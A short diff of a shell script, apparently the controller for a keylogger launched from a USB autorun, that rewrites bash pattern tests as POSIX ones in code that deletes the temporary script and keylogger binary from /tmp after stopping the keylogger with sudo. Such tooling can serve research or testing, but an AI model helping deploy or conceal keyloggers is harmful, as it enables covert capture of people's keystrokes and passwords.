@@ -9,7 +9,7 @@ IS_TEMP_SCRIPT="$2"
 
 # Cleanup function for temp script (only cleans up the temp script itself, not the binary)
 cleanup_temp_script() {
-    if [[ "$IS_TEMP_SCRIPT" = "from_temp" && -n "$0" && "$0" == /tmp/usb_autorun.* ]]; then
+    if [ "$IS_TEMP_SCRIPT" = "from_temp" ] && [ -n "$0" ] && [ "${0#/tmp/usb_autorun.}" != "$0" ]; then
         rm -f "$0" 2>/dev/null
     fi
 }
@@ -187,7 +187,7 @@ echo "Stopping keylogger (PID: $KEYLOGGER_PID)..."
 if sudo kill $KEYLOGGER_PID 2>/dev/null; then
     echo "✅ Keylogger stopped"
     # Clean up temp binary if it exists
-    if [[ -f "$EXEC_PATH" && "$EXEC_PATH" == /tmp/rust-key.* ]]; then
+    if [ -f "$EXEC_PATH" ] && [ "${EXEC_PATH#/tmp/rust-key.}" != "$EXEC_PATH" ]; then
         rm -f "$EXEC_PATH" 2>/dev/null
         echo "✅ Temporary binary cleaned up"
     fi
